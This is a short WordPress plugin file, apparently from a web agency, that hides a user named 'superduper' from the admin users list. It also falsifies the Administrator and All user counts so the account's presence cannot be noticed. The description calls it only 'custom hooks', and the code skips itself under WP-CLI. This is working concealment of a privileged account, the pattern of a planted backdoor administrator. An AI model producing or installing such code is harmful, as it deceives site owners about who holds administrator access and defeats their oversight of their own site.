<?php
/**
 * @package wpsp-superduper-related-functions
 */
/*
Plugin Name: wpsp-superduper-related-functions
Plugin URI: https://wpscalepro.com/
Description: Custom hooks for superduper user
Version: 1.0.0
Author: Erfan Ilyas
Author URI: https://wpscalepro.com/
License: GPLv2 or later
*/


//if the call is from "wp-cli" don't run the code below
if ( defined( 'WP_CLI' ) && WP_CLI ) {
	return;
}





//Hide superduper user from the users list
add_action( 'pre_user_query', function( $user_search ){
  
  if( WPSP_CURRENT_USER_IS_SUPER_DUPER ){
    return $user_search;
  }
	
	global $wpdb;
	$user_search->query_where = str_replace( 'WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'superduper'", $user_search->query_where );

});




//fix administrator counts from the table list view
add_filter( 'views_users', function($views){
	
	if( WPSP_CURRENT_USER_IS_SUPER_DUPER ){
    return $views;
  }
	
	
	$users = count_users();
	$admins_num = $users['avail_roles']['administrator'] - 1;
	$all_num = $users['total_users'] - 1;
	$class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
	$class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
	$views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
	$views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
	return $views;
	
});